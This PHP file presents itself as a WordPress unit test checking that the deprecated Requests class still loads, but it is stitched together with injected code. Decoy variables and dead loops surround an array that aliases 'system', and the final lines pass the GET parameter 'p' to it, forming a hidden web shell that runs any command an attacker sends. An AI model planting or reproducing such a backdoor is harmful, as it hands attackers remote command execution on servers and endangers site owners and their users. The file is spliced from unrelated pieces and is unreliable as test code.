<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * Tests that the old Requests class is included
 * for plugins or themes that still use it.
 *
 * @group http
 */
class Tests_HTTP_IncludeOldRequestsClass extends WP_UnitTestCase {

	/**
	 * @ticket 57341
	 *
	 * @coversNothing
	 */
	public function test_should_include_old_requests_class() {
		$this->expectDeprecation();
		$this->expectDeprecationMessage( 'The PSR-0 `Requests_...` class names in the Requests library are deprecated.' );

		new Requests();
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>